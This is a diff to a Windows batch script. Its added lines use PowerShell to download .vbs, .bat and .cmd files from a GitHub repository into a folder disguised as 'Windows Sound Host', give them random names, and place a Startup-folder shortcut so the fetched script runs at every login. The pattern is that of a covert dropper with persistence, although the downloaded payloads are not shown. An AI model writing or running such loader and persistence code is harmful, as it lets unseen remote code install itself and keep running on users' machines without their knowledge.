@@ -8,10 +8,10 @@ cd %path1%
 pause 
 
 
-powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest ''
+powershell Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/i.vbs' -Outfile ./15a65da65s1d8w86s51d8aw.vbs; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/snds.bat' -Outfile ./116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat; Invoke-WebRequest 'https://raw.githubusercontent.com/LONG-BAT/Sounds-/refs/heads/main/Autorun.cmd' -Outfile ./31513wd5w1d3a5wd185s3d51a.cmd
 pause 
-if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk ( 
-    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\116161as5d1a5d3a21sd51aw13s1d85aw1d35.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\116161as5d1a5d3a21sd51aw13s1d85aw1d35.bat';$s.Save()"
+if not exist %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk ( 
+    powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\31513wd5w1d3a5wd185s3d51a.lnk');$s.TargetPath='%userprofile%\documents\Windows Sound Host\31513wd5w1d3a5wd185s3d51a.cmd';$s.Save()"
     
 )
 timeout 150
